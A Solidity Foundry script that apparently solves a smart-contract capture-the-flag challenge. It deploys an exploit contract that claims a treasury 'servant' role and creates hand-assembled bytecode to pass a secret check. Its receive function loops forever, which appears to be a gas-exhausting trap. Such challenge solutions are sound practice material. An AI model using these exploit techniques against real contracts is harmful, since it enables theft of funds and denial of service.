// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import {Script,console} from "forge-std/Script.sol";

interface Treasury{
    function BecomeServant(address _servant) external;
    function withdraw() external; 
}

interface SecretChecker{
    function IKnowTheSecret(address _servant) external;

}

interface Setup{
    function treasury() external returns (Treasury);
    function secretChecker() external returns (SecretChecker);
    function isSolved() external returns (bool);
}

contract Solve is Script{
    Exploit exploit;
    function run()public{
        vm.startBroadcast();
        exploit=new Exploit();
        exploit.pwn();
        vm.stopBroadcast();
    }
}


contract Exploit{
    Setup setup=Setup(0x0954D2Ce53A09AeCa2E82FfcB3aCbe8C5B3038c2);
    Treasury treasury=setup.treasury();
    SecretChecker secretChecker=setup.secretChecker();

    function pwn()public{
        treasury.BecomeServant(address(this));
        address deployedAddress;
        bytes memory bytecode = hex"736a49276d5f4c3079616c3b2960005260206000f36000526014600cf3";
        assembly {
            deployedAddress := create(0, add(bytecode, 0x20), mload(bytecode))
        }
        require(deployedAddress != address(0), "Deployment failed");
        secretChecker.IKnowTheSecret(deployedAddress);
        require(setup.isSolved(),"Exploit Failed");
    }


    receive() external payable{
        while(true){

        }
    }
        
}




/*
init: 601460xx600039600a6000f3
runtime: 6049276d5f4c3079616c3b2960505260206050f3

runtime: 6a49276d5f4c3079616c3b2960005260206000f3
finalcode: 736a49276d5f4c3079616c3b2960005260206000f36000526014600cf3
*/


